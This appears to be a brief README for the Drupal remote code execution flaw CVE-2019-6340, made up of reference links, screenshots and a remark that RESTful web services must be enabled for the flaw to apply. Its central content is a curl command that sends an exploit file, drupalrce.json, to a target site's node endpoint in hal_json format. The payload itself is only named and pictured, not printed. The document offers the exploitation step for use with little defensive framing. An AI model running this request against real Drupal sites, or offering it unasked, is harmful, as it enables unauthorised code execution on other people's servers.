# Drupal-SA-CORE-2019-003 CVE-2019-6340
Drupal SA-CORE-2019-003 CVE-2019-6340

 CVE-2019-6340.md
https://mp.weixin.qq.com/s/EQD4-K6HgBY9wdzeXeyzkg

https://paper.seebug.org/821/


https://www.youtube.com/watch?v=QtLDDN0Duko

[linkname](https://www.youtube.com/watch?v=QtLDDN0Duko)




https://pbs.twimg.com/media/D0C-KiXX4AM2vR3.jpg:large

![marty-mcfly](https://pbs.twimg.com/media/D0C-KiXX4AM2vR3.jpg:large)


CVE-2019-6340 isn’t a default configuration, you have to manually enable Restful web services: 




![marty-mcfly](https://pbs.twimg.com/media/D0EShBfWwAEXxK0.jpg:large)


Command
$ curl -k -v -H 'Content-Type: application/json' -d @./drupalrce.json 'https://<http://your.web.site >/node/<node_id>?_format=hal_json'

file drupalrce.json


![marty-mcfly](https://pbs.twimg.com/media/D0MAcBJXQAADbCw.jpg:large)
